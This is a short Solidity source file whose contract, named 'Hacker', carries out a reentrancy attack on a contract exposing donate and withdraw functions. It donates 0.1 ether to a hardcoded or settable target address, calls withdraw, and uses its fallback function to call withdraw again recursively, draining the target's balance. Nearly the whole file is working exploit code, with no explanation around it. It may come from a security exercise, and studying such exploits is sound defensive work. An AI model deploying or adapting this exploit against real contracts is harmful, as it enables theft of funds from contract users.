pragma solidity ^0.4.18;

interface Honey { 

  function donate(address _to) public payable;
  
  function balanceOf(address _who) public view returns (uint balance);

  function withdraw(uint _amount) public;
}

contract Hacker {
    Honey public c; 
    
    address target = 0x77d42385f1ae637c9ef2e80e50db7aa2803e886b;
    
    function setTarget(address addr){
        target = addr;
    }
  
    function hack() {
       c = Honey(target);       
    }
    
    function attack() payable {
       c.donate.value(0.1 ether)(this);
       c.withdraw(0.1 ether);
    }
    
    function() payable {
        c.withdraw(0.1 ether);
    } 
}